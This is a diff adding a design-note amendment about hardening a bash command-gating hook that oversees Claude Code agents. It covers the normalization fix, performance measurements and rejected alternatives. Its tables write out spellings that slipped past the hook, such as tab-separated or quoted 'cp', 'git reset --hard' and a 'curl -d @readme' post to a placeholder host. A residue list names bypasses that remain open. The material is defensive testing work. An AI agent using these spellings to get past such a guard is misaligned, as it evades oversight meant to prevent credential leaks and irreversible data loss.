@@ -1454,3 +1454,323 @@ NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Co
 which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
 this family recorded. INFERRED, not measured: nothing new this cycle. The worktree hook's
 own blindness is MEASURED, and only its FIX is deferred.
+
+## Amendment (cycle U): the BASH pattern layer, and the four sites that must not be normalized
+
+Seventh instance of the same seam, one layer earlier than every amendment above. Cycles O
+through T all live at or below `shlex.split`. This one never reaches it: `case "$CMD" in
+*"cp "*)` asks whether the raw command TEXT contains `c`, `p`, space, while a shell asks
+whether the first WORD of a command resolves to `cp`. Those two questions disagree on
+every spelling where the separator is not a single literal space, or where a quote
+character sits between the letters and the separator, and every guard's default arm is
+`*) exit 0`, so a disagreement is a SILENT ALLOW that the extractor never gets to judge.
+
+### Measured before the fix, through the REAL hook
+
+Not through the extractor, and the distinction is the whole cycle: `_extract` slices the
+embedded python out of the hook and runs it standalone, which BYPASSES the bash prefilter
+by construction. That is exactly why this defect survived seven cycles of extractor-level
+evidence. Every figure below is a `permissionDecision` from a real `PreToolUse` envelope
+piped to `hooks/scripts/writ-bash-write-gate.sh`.
+
+```
+                                            before        after
+cp<TAB>readme <cred>                        SILENT        deny  [SEC-CREDENTIAL-WRITE]
+"cp" readme <cred>                          SILENT        deny  [SEC-CREDENTIAL-WRITE]
+'cp' readme <cred>                          SILENT        deny  [SEC-CREDENTIAL-WRITE]
+"/bin/cp" readme <cred>                     SILENT        deny  [SEC-CREDENTIAL-WRITE]
+echo x | tee<TAB><cred>                     SILENT        deny  [SEC-CREDENTIAL-WRITE]
+git<TAB>reset --hard HEAD~1                 SILENT        deny  [ENF-IRREVERSIBLE]
+"git" reset --hard HEAD~1                   SILENT        deny  [ENF-IRREVERSIBLE]
+git<TAB><TAB>reset --hard HEAD~1            SILENT        deny  [ENF-IRREVERSIBLE]
+git<TAB>push --force origin main            SILENT        deny  [ENF-IRREVERSIBLE]
+curl<TAB>-d @readme https://example.invalid SILENT        ask   [SEC-BASH-EGRESS]
+"curl" -d @readme https://example.invalid   SILENT        ask   [SEC-BASH-EGRESS]
+python3 "benchmarks/bench_targets.py"       SILENT        deny  [ENF-IRREVERSIBLE]
+bash hooks/scripts/auto-approve"-"gate.sh   SILENT        deny  [ENF-GATE-STATE]
+python3<TAB>-c "open('src/x.py','w')"       SILENT        deny  [ENF-GATE-PLAN]
+
+/bin/cp readme <cred>                       deny          deny  (control)
+cp readme <cred>                            deny          deny  (control)
+dd if=/dev/zero of=<cred>                   deny          deny  (control)
+git reset --hard HEAD~1                     deny          deny  (control)
+git push --force origin main                deny          deny  (control)
+curl -d @readme https://example.invalid     ask           ask   (control)
+python3 benchmarks/bench_targets.py         deny          deny  (control)
+cat <gate-state-path>                       SILENT        SILENT (negative control)
+```
+
+Two of those rows are worth naming because they are the same family and neither is about
+whitespace. `python3 "benchmarks/bench_targets.py"` was silent because the raw token ends
+in a quote character, so it never matched the `*.py` glob `_irrev_script_target` walks and
+the script's CONTENT was never read: the 2026-08-05 wipe vector, reachable by adding two
+characters. And `auto-approve"-"gate.sh` was silent because the embedded quote pair splits
+the identifier into two literal runs that a plain substring match cannot see across.
+
+### Decision: normalize a COPY once, and route PER SITE
+
+One normalized copy, computed immediately after `CMD="$HOOK_COMMAND"` and before the first
+guard, inside a `# CMD NORMALIZATION BEGIN/END` marker block so a test can read it:
+
+```bash
+CMD_N="${CMD//[$'\t\n']/ }"
+CMD_N="${CMD_N//[$'\x22\x27']/}"
+while [[ "$CMD_N" == *"  "* ]]; do CMD_N="${CMD_N//  / }"; done
+```
+
+Three pieces, each settled on its own.
+
+TAB AND NEWLINE ONLY. Space, tab and newline are exactly bash's default IFS whitespace.
+Carriage return, vertical tab and form feed are NOT token separators to bash, so
+translating them would model a shell that does not exist. The bracket-class substitution
+is the idiom `bin/lib/common.sh` already uses, so it is a reused pattern rather than a new
+one.
+
+THE QUOTE CLASS IS SPELLED `[$'\x22\x27']`, and the reason first recorded here WAS WRONG.
+The plan and the first draft of this amendment both said `[\"\']` "would silently strip
+BACKSLASHES from every command", on the reasoning that inside double quotes `\'` is a
+backslash followed by an apostrophe. REVIEW RAN IT: in bash 5.2.21 both spellings produce
+byte-identical output across six inputs including literal backslashes, `\'`-adjacent
+apostrophes and Windows-style paths, and neither strips a backslash. The `\x22\x27`
+spelling stays because the code points are unambiguous to a reader, which is a
+readability argument and not a correctness one.
+
+The wrong claim is corrected in place rather than deleted, because the failure it
+illustrates is this document's own subject: a confident mechanism claim, stated in three
+files, that nobody executed. It is the same discipline the rest of this amendment applies
+to the hook's behaviour, applied to a sentence about bash instead.
+
+Removal with no space inserted is what a shell does for adjacent quoting, which is why
+`"cp" x` and `auto-approve"-"gate` both collapse the way the shell collapses them. That
+half was measured.
+
+COLLAPSING IS REQUIRED, not tidying, and the reason is a list rather than an argument:
+`git reset --hard`, `git tag -d `, `git branch -D`, `docker exec`, `docker compose exec`,
+`sed -i` and `sed --in-place` each need exactly ONE space, and `git<TAB><TAB>commit` and
+`git  reset  --hard` are legal shell that one space does not match.
+
+THE MECHANISM IS ONE IFS WORD SPLIT AND REJOIN (`read -ra` then `"${_cmd_words[*]}"`),
+single pass and forking nothing. IT WAS A FIXED-POINT LOOP FIRST, and review measured that
+loop QUADRATIC in the longest whitespace run: `while [[ "$CMD_N" == *"  "* ]]` took 0.03s
+at 10,000 consecutive spaces, 0.46s at 40,000 and 1.88s at 80,000, running on EVERY Bash
+call ahead of every guard. A heredoc or a pasted blob reaches that size without trying, so
+it was a hang the user would feel, and if the hook harness times out and fails open it
+takes every guard in this file with it. The single pass does 400,000 spaces in 0.03s.
+
+THE ORDER OF THE TWO NORMALIZATION LINES IS LOAD-BEARING, and it is the reason the plan
+had rejected `read -ra` outright: `read` reads ONE LINE, so on raw input it would truncate
+a multi-line command and blind every guard past the first newline. That objection dies
+once the preceding line has already turned every newline into a space, because by then
+there is no newline left to stop at. Swapping the two lines reintroduces the truncation,
+which is why the hook says so at the site.
+
+FIVE SITES TAKE THE NORMALIZED COPY, and each is a `*) exit 0` fail-open or the sole
+decider at its own layer:
+
+- THE STATE NAME GUARD. Normalize FIRST, scrub second
+  (`CMD_FOR_STATE_MATCH="${CMD_N//test_manual_test_grant.py/}"`), so a quoted spelling of
+  the test file name still scrubs. All ten patterns are quote-free single tokens with no
+  internal space, so normalization can only ADD matches, and this guard is the ONLY layer
+  for an EXECUTION vector: the extractor classifies write TARGETS and never sees an
+  attempt to RUN the minter. The mid-identifier quote split is therefore closed HERE.
+- `_irreversible_reason`, which now takes both spellings. `lower` folds from the
+  normalized copy, the case-sensitive `git branch -D` arm reads it too (normalization
+  preserves case), and `_irrev_script_target` gets it. This site has NO second layer, so a
+  miss is a complete pass-through of a destructive command.
+- THE `git commit` REVIEW ASK, OUTER CASE ONLY. See the next section.
+- THE WRITE AND EGRESS PREFILTER, whose default arm is the whole hole. No pattern in that
+  arm contains a quote character, so quote removal cannot unmatch any of them.
+- THE INLINE-INTERPRETER SECOND STAGE. Stage 1 (`*python*`) is whitespace-blind already,
+  so the entire miss was at stage 2, where every flag glob carries the space that precedes
+  a real flag.
+
+FOUR SITES KEEP THE RAW TEXT, and this half is the load-bearing one, because three of the
+four would BREAK on the normalized copy and the fourth would loosen a guard.
+
+- `_readonly_inspection`, ALWAYS RAW. It asks what a command CAN DO, so stripping quotes
+  would make MORE commands qualify as read-only inspection (a quoted verb like `"cat"`
+  would resolve), which LOOSENS an allow arm on the one guard protecting an execution
+  vector. An allow-side test cannot see a new allow, so a loosening belongs in a cycle
+  that can measure the allow side. The accepted cost is stated below rather than
+  discovered later.
+- THE INNER `_GIT_COMMIT_RE` GREP. grep is LINE ORIENTED and that regex anchors on
+  `(^|[;&|]|&&|\|\|)`, so newline-flattened text would stop matching a `git commit` that
+  begins the SECOND line of a multi-line command, turning a working ask into silence. It
+  needs no help anyway: the regex is already `[[:space:]]+`-based, so once the outer arm
+  opens on the normalized copy the inner regex matches `git<TAB>commit` on raw text with
+  no change. Routing it onto the copy would also start matching `echo "; git commit"`, and
+  a false ask at this site is user-visible friction by that arm's own recorded standard.
+- THE `/update` GUARD. Its regex's character classes literally CONTAIN the quote
+  characters (`[^[:space:]"']*`), so feeding it quote-stripped text changes what the
+  pattern means.
+- `WRIT_BASH_CMD="$CMD"`, THE EXTRACTOR'S INPUT, and this is the most important
+  non-regression in the cycle. Redirect detection there is quote-AWARE by design:
+  `shlex.split(posix=False)` keeps quote characters on tokens so that `grep '>' app.pem`
+  is not read as a redirect. Feeding the normalized copy in would put a bare `>` in
+  redirect position and turn that read-only grep into a `[SEC-CREDENTIAL-WRITE]` deny. The
+  existing pin for that behavior goes through `_extract` and is therefore structurally
+  BLIND to this mutation, which is why the new pin drives the real hook.
+
+The review-record guard is a fifth raw site with a duller reason: its outer glob needs no
+adjacent space and its inner regex is already `[[:space:]]`-based, so no measured spelling
+is blind at it and there is nothing for normalization to buy.
+
+### The false-positive direction, verified by reading the consumer rather than trusted
+
+The prefilter's own comment claims a stray match costs one spawn and never a false verdict
+because the extractor decides. VERIFIED: the consumer opens with `[ -z "$TARGETS" ] &&
+exit 0`, and every deny and ask below it is driven by a ROW the extractor emitted (`cred`,
+`state`, `local`, `outside`, `unknown`, `egress`). Nothing downstream reads "the prefilter
+matched" as evidence, and no counter, log row or state is written on a match alone. So for
+the prefilter and the interpreter stage the widening is free in VERDICT terms and not
+merely cheap.
+
+The claim does NOT hold at the other three sites, and they are treated accordingly. The
+irreversibility guard, the state guard and the commit ask ARE the deciders at their own
+sites, so a stray match there is a real refusal or a real prompt. For those, the widening
+is confined to spellings a shell would genuinely run, the read-only inspection escape
+stays on raw text so ordinary greps stay exempt, and the commit site keeps its raw inner
+discriminator.
+
+### Alternatives rejected
+
+1. **A TOKENIZER FIX AT THIS LAYER, which is what the next reader will reach for.** Ruled
+   out for the same shape of reason the cycle O amendment ruled out making `(` a token
+   boundary, but with a different mechanism: an IFS `read -ra` round trip over the command
+   reads ONE LINE, so a multi-line command would be TRUNCATED and every guard below would
+   go blind on everything after the first newline. That is a NEW fail-open of exactly the
+   class this amendment closes, and `_irrev_script_target` already carried that narrowness
+   before this cycle.
+2. **`extglob` (`${v//+( )/ }`) for the space collapse.** Rejected on blast radius:
+   `extglob` is enabled nowhere in this repo, and turning it on changes pattern semantics
+   for every `case` in a 3000-line file full of them. That is a large behavioral surface
+   for one substitution, and the doubling loop is pure parameter expansion with no
+   semantics to change.
+3. **Normalizing the EXTRACTOR'S input as well, for consistency.** Rejected on the
+   measured `grep '>' app.pem` behavior above: consistency there converts a read-only grep
+   into a credential-write deny.
+4. **ADDING THE BLIND SPELLINGS AS NEW PATTERNS.** Rejected because it grows a substring
+   blocklist, which ABS-SECURITY-024 forbids where the valid set is enumerable. The
+   command is normalized once so the EXISTING patterns see what a shell would run, and the
+   decider stays the extractor's verb resolution, which is allowlist-shaped (a known verb
+   in command position). Same rule is why the state guard keeps its ONE named scrub instead
+   of accumulating exemptions.
+5. **Widening the irreversibility guard's VERB LIST while in there.** `rm -rf`,
+   `DROP TABLE` and `TRUNCATE` stay out by the recorded ruling in that block.
+
+### Accepted cost
+
+A quoted-verb read-only inspection naming gate state is now REFUSED where the bare
+spelling is allowed. MEASURED: `cat <gate-state-path>` stays silent, `"cat"
+<gate-state-path>` denies with `[ENF-GATE-STATE]`. That follows directly from
+`_readonly_inspection` staying on raw text while the state guard moved to the normalized
+copy, it is fail-closed, the Read tool covers it, and a test pins the asymmetry
+deliberately so it reads as a decision rather than a surprise.
+
+### The process figures, measured and not asserted
+
+PERF-QBUDGET-001's budget here is process spawns per Bash call. Both hook versions were
+run SIDE BY SIDE out of one mirror tree, so `WRIT_DIR`, cwd, env and cache were identical
+between the two runs and the only difference was the hook source; the baseline copy came
+from `git show HEAD:hooks/scripts/writ-bash-write-gate.sh`. Totals come from
+`tests/_strace.py::trace_execve`.
+
+IDENTIFYING THE EXTRACTOR NEEDED ONE MORE FLAG, and the reason is a measurement that
+refuted the obvious discriminator. A bare-argv `execve("/usr/bin/python3", ["python3"])`
+is NOT unique to the extractor: `emit_deny` and `emit_ask` in `bin/lib/common.sh` are
+heredoc-fed `python3` too, so a command denying at the IRREVERSIBLE guard, which never
+reaches the extractor, produces the identical shape. Counting bare argv would have
+reported those as extractor hits. The extractor is therefore identified by the thing only
+it has, `WRIT_BASH_CMD` in its own envp, which `strace -v` prints.
+
+```
+population                              commands   reached extractor    total execves
+                                                    before    after     before   after
+(a) derived blind-spelling matrix          51       19/51     51/51       409     690
+(b) unchanged control set                  25        1/25      1/25       126     126
+(c) widening probe, git commit -m "cp fix"  1        1/1       1/1          8       8
+```
+
+The number that matters is population (b): 126 execves before, 126 after, mean 5.0 per
+call both sides, and the same single command reaching the extractor on both. That command
+is `git add -A`, which matches `*"dd "*` on the substring `add ` and always did; it is a
+standing illustration of the prefilter's deliberate looseness, not a regression.
+Population (a) is adversarial by construction, so its 19/51 to 51/51 is the fix working
+rather than a cost, and its execve growth is the price of EMITTING A REFUSAL
+(`log_gate_decision` plus the friction append plus `emit_deny`), not the price of the
+prefilter. Population (c) did not move at all, and the reason is worth recording because
+the plan predicted it would: the raw text of `git commit -m "cp fix"` literally contains
+`cp ` inside the quoted message, so it was already matching before the fix.
+
+The plan's actual cost claim, a STRAY match whose verdict is unchanged, was measured
+separately because no member of (a) is one. `"cp" --version`, `tee<TAB>--version` and
+`"curl" --version` each go from 0 to 1 extractor spawn, 5 to 6 total execves, and SILENT
+to SILENT: exactly the predicted one added python start, with the `$(pwd)` subshell costing
+no execve because `pwd` is a builtin. `sed  --version` newly normalizes to `sed --version`
+and matches NOTHING, staying at 5 execves, which is the check that collapsing does not
+widen indiscriminately.
+
+The only test-level pin is structural rather than a timing: the normalization block
+between its markers must contain no command substitution, no pipe and no external command
+name, so the per-call cost cannot silently grow into a fork. A timing on a loaded machine
+is not a ratchet.
+
+### Residue that stays open, so the fix is not read as wider than it is
+
+- AN INTERPOSED GLOBAL FLAG on the irreversibility arm: `git -C /tmp reset --hard HEAD~1`,
+  `git --no-pager reset --hard`, `git -c core.x=1 reset --hard`. The commit arm one site
+  above already carries a `*"git -"*" commit"*` alternative for exactly this shape; the
+  irreversibility arm has none. MEASURED still silent after the fix.
+- REORDERED FLAGS: `git reset HEAD~1 --hard`, which git accepts. MEASURED still silent.
+- ABBREVIATED LONG FLAGS (`git reset --har`, an unambiguous prefix git accepts), ALIASES
+  AND WRAPPER SCRIPTS, and a VALUE ASSEMBLED FROM A VARIABLE (`V=--hard; git reset $V`).
+- THE THREE MID-WORD QUOTE SPLITS on the write and egress path (`"c"p`, `c"p"`, `"c"url`).
+  Normalization makes them REACH the extractor and the extractor still cannot resolve
+  them: `dequote` strips only a matched OUTER pair and `shlex.split(posix=False)` splits
+  `"c"p` into two tokens, the same defect as the strict xfail at `partial_quote_prefix` in
+  `tests/test_bash_expansion_boundary_gate.py`. That layer is shared with two sibling hooks
+  through the `MIRROR BEGIN/END` block, so it carries different risk and gets its own
+  cycle.
+- BACKSLASH ESCAPING (`c\p`, `git\ reset`) and ANSI-C quoting (`cp$'\x20'x`), same token
+  layer, same deferral.
+
+Each of the first three needs a per-verb argument walk (the `verb_at` shape) rather than a
+phrase match, so each is the deferred token layer and not a pattern tweak. The first two
+and the `"c"p` split are pinned as `xfail(strict=True)` in
+`tests/test_bash_pattern_spelling_gate.py`, so a later cycle that closes any of them turns
+that test GREEN, which strict mode reports as a failure and forces updating this
+disclosure rather than leaving it stale.
+
+### The population is DERIVED, which is what keeps the new test from decaying
+
+A `# PREFILTER PATTERNS BEGIN/END` marker block wraps the write and egress arm's glob
+literals and nothing else. The test parses every `*"..."*` literal out of it and keeps the
+ones CONTAINING A SPACE, which is precisely the vulnerable shape (17 members today, from
+`tee ` to `curl `). The space-free globs (`>`, `--in-place`, `--target-directory`) are
+excluded by a PROPERTY assertion rather than by a list, so a future space-free pattern is
+excluded automatically and a future space-bearing one is not. A probe table supplies one
+canonical command per member, the test asserts the table's key set EQUALS the derived set,
+and the three blind spellings are derived per member from the canonical probe, so a verb
+added to the case block with no probe goes red instead of sitting outside a stale literal.
+The canonical spelling runs as a control in every row, which is the anti-vacuity guard: a
+probe whose canonical form produces no verdict fails before its blind spellings can pass
+for the wrong reason.
+
+### Measured versus inferred
+
+MEASURED: the twenty-two full-hook `permissionDecision` values in the table above, before
+and after, including the deny TAG and the two negative controls; the two residue silences;
+the three populations' extractor-reach and execve figures side by side out of one mirror
+tree; the four stray-match probes with their decisions on both sides; and the whole
+`tests/test_bash_pattern_spelling_gate.py` matrix, whose 103 assertions each name the
+mutation that reddens them.
+
+NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
+which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
+this family recorded. No test in this cycle creates, opens or reads a credential file; the
+classifier is path-only. INFERRED, not measured: nothing. The two irreversibility residues
+were executed rather than reasoned about, which is how the plan's prediction that a
+destructive command on the SECOND LINE of a multi-line command was a phrase-match bypass
+came to be CORRECTED: `case` glob matching is not line-anchored, so `*"git reset --hard"*`
+already matched straight across an embedded newline. The genuinely line-bound blindness was
+`_irrev_script_target`'s `read -ra`, and that is what the fix addresses.
